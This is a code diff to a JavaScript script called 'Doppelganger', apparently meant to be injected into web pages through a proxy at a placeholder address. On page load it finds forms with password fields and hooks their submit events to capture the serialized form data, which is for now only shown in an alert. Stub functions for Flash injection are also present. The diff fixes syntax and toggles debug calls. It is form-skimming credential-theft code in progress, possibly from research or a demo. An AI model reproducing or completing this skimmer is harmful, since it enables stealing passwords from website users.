@@ -1,10 +1,10 @@
-var httpServer="http://proxyIpAddr:httpPort"
+var httpServer="http://proxyIpAddr:httpPort";
 
 function initialize_doppelganger()
 {
-	display_calling_card();
+	//display_calling_card();
 	//form_steal();
-	//alert("Doppelganger running!");
+	alert("Doppelganger running!");
 }
 
 function display_calling_card()
@@ -20,6 +20,11 @@ function display_calling_card()
 	body.update(img);
 }
 
+function steal_form_data(form)
+{
+	alert(Form.serialize(form));
+}
+
 function form_steal()
 {
 	var forms = $$('form');
@@ -31,8 +36,10 @@ function form_steal()
 		{
 			if (formElements[j].type == "password")
 			{
-				if (forms[i].id = "")
+				if (forms[i].id === "")
+				{
 					forms[i].id = "form" + j;
+				}
 
 				Event.observe(forms[i].id, "submit", steal_form_data(forms[i]));
 			}
@@ -40,10 +47,7 @@ function form_steal()
 	}
 }
 
-function steal_form_data(form)
-{
-	alert(Form.serialize(form));
-}
+
 
 function flash_inject()
 {
@@ -54,5 +58,5 @@ function break_fixit()
 {
 }
 
-Event.observe(window, "load", function() { initialize_doppelganger(); })
+Event.observe(window, "load", function() { initialize_doppelganger(); });
 
